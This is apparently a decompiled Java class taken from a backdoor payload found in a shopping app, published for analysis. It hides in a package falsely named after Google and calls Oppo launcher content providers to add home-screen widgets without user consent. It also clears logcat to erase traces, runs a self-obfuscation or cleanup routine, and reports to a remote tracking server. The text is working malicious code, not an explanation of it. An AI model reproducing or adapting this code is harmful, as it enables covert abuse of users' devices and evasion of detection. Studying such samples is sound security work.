package com.google.android.sd.biz_dynamic_dex.oppoaddwidget;

import android.content.Context;
import android.net.Uri;
import android.os.Bundle;
import com.coloros.backup.sdk.v2.common.host.BREngineConfig;
import com.coloros.backup.sdk.v2.component.BRPluginHandler;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.biz_dynamic_dex.base.INotBizProcess;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.IProxyServerBase;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.IProxyServerSetting;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.server.ProguardUtils;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.server.RemoteTrackUtils;

public class OppoAddWidgetCore implements IProxyServerSetting, INotBizProcess {
  private Context context;
  
  private String addWidget(String paramString) {
    try {
      return this.context.getContentResolver().call(Uri.parse(queryLauncherInfo(this.context)), "requestAddWidget", paramString, null).getBoolean("is_request_success") ? "" : "add_widget_fail";
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("add_widget_fail_");
      stringBuilder.append(exception.getMessage());
      return stringBuilder.toString();
    } 
  }
  
  private String queryLauncherInfo(Context paramContext) {
    try {
      paramContext.getPackageManager().getApplicationInfo("com.android.launcher", 128);
      return "content://com.android.launcher.settings";
    } catch (Exception exception) {
      return "content://com.oppo.launcher.settings";
    } 
  }
  
  public void init(Context paramContext) {
    try {
      this.context = paramContext;
      RemoteTrackUtils.init();
      ProguardUtils.proguardFile(paramContext, 15000L);
      DynamicUtils.clearLogcat();
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public Bundle innerExecute(Bundle paramBundle) {
    String str2 = paramBundle.getString("BUNDLE_REQUEST_SID");
    String str3 = paramBundle.getString("BUNDLE_REQUEST_SD_VERSION");
    String str4 = paramBundle.getString("BUNDLE_REQUEST_SD_URL");
    String str1 = paramBundle.getString("BUNDLE_REQUEST_WIDGET");
    RemoteTrackUtils.SID = str2;
    RemoteTrackUtils.SD_VERSION = str3;
    RemoteTrackUtils.URL = str4;
    str1 = addWidget(str1);
    Bundle bundle = new Bundle();
    bundle.putString("BUNDLE_RESPONSE_FAIL_REASON", str1);
    DynamicUtils.clearLogcat();
    return bundle;
  }
  
  public void onCreate(Context paramContext, BRPluginHandler paramBRPluginHandler) {
    init(paramContext);
  }
  
  public void onCreate(Context paramContext, BRPluginHandler paramBRPluginHandler, BREngineConfig paramBREngineConfig) {
    init(paramContext);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppoaddwidget\OppoAddWidgetCore.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */